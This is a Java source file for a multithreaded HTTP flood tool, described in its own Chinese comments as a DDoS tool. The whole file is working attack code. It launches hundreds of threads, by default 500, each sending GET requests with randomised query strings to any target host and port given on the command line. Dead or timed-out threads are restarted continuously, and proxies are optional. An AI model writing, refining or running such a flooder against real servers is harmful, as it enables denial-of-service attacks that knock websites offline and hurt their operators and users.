package com.main.exe;


import java.io.IOException;
import java.net.ConnectException;
import java.net.InetSocketAddress;
import java.nio.ByteBuffer;
import java.nio.channels.SelectionKey;
import java.nio.channels.Selector;
import java.nio.channels.SocketChannel;
import java.util.Iterator;
import java.util.Random;
import java.util.Set;
import java.util.Timer;
import java.util.TimerTask;
import java.util.Vector;


/**
 * JAVA写的一款DDOS工具
 * 
 */
/**
 * 守护线程
 * 
 * @author zhanghongbo
 * 
 */
public class DdosExe {
	private String host, uri, param;
	private int port;
	private final Vector<CCDDOSThread> v = new Vector<CCDDOSThread>();
	private InetSocketAddress isa;
	private int threadsCount = 500;// 线程数
	private Random r = new Random();
	private long timeout = 5000l;

	/**
	 * 开启攻击
	 */
	public void start() {
		for (int i = 0; i < threadsCount; i++) {
			CCDDOSThread t = new CCDDOSThread();
			v.add(t);
			t.start();
		}
		Timer t = new Timer();
		t.schedule(new TimerTask() {
			public void run() {
				int count = 0, timeoutthreads = 0;
				long ct = System.currentTimeMillis();
				for (Iterator<CCDDOSThread> it = v.iterator(); it.hasNext();) {
					CCDDOSThread th = it.next();
					if (th.isCancle() || !th.isAlive()) {
						it.remove();
						th = null;
						count++;
					} else if (ct - th.start > timeout) {
						// 超时，外部结束
						timeoutthreads++;
						th.setCancle(true);
						th.interrupt();
						it.remove();
						th = null;
						count++;
					}
				}
				if (count == 0) {
					return;
				}
				System.out.println("已经关闭线程:" + count + ",其中连接超时线程:"
						+ timeoutthreads);
				for (int i = 0; i < count; i++) {
					CCDDOSThread th = new CCDDOSThread();
					v.add(th);
					th.start();
				}
			}
		}, 0l, 100l);
		System.out.println("守护线程已经启动:");
	}

	/**
	 * @param args
	 */
	public static void main(String[] args) {
		if (args.length < 6) {
			System.out.println("使用说明:");
			System.out
					.println("java org.p3p.net.ccddos.DdosExe <主机> <port> <同时开启的线程数> <URI> <参数> <连接超时> [<代理主机> <代理端口>]");
			System.out.println("");
			System.exit(0);
		} else if (args.length >= 8) {
			// 设置有代理
			System.getProperties().put("proxySet", "true");
			System.getProperties().setProperty("http.proxyHost", args[6]);
			System.getProperties().setProperty("http.proxyPort", args[7]);
		}

		DdosExe m = new DdosExe();
		m.host = args[0];
		m.port = Integer.valueOf(args[1]);
		m.uri = args[3];
		m.param = args[4];
		m.threadsCount = Integer.valueOf(args[2]);
		m.timeout = Long.valueOf(args[5]);
		m.isa = new InetSocketAddress(m.host, m.port);
		m.start();
	}

	/**
	 * 攻击线程
	 * 
	 * @author zhanghongbo
	 * 
	 */
	class CCDDOSThread extends Thread {
		private boolean cancle = false;
		public long start = System.currentTimeMillis();

		public void setCancle(boolean cancle) {
			this.cancle = cancle;
		}

		public boolean isCancle() {
			return cancle;
		}

		public void run() {
			long start = System.currentTimeMillis();
			Selector selector;
			try {
				selector = Selector.open();
				SocketChannel sc;
				try {
					sc = SocketChannel.open(isa);
				} catch (ConnectException ex) {
					// System.out.println(ex.getMessage());
					cancle = true;
					selector.close();
					return;
				}

				sc.configureBlocking(false);
				sc.register(selector, SelectionKey.OP_WRITE
						| SelectionKey.OP_READ);
				wait: while (selector.select() > 0 && !cancle) {
					if (System.currentTimeMillis() - start > timeout) {
						cancle = true;
						break wait;
					}
					Set<?> readykey = selector.selectedKeys();
					Iterator<?> it = readykey.iterator();
					while (it.hasNext() && !cancle) {
						if (System.currentTimeMillis() - start > timeout) {
							cancle = true;
							break wait;
						}
						SelectionKey skey = (SelectionKey) it.next();
						it.remove();
						SocketChannel scc = (SocketChannel) skey.channel();

						if ((skey.readyOps() & SelectionKey.OP_WRITE) == SelectionKey.OP_WRITE) {
							String head = "GET " + uri + "?" + param
									+ "&rndnum=" + r.nextInt()
									+ " HTTP/1.1\r\n" + "Host: " + host
									+ "\r\n" + "Connection:close\r\n" + "\r\n";
							ByteBuffer bbf = ByteBuffer.wrap(head.getBytes());
							scc.write(bbf);
						}
						skey.cancel();
						scc.close();
					}
				}
				selector.close();
				sc.close();

			} catch (IOException ex) {
				cancle = true;
			}
		}
	}
}
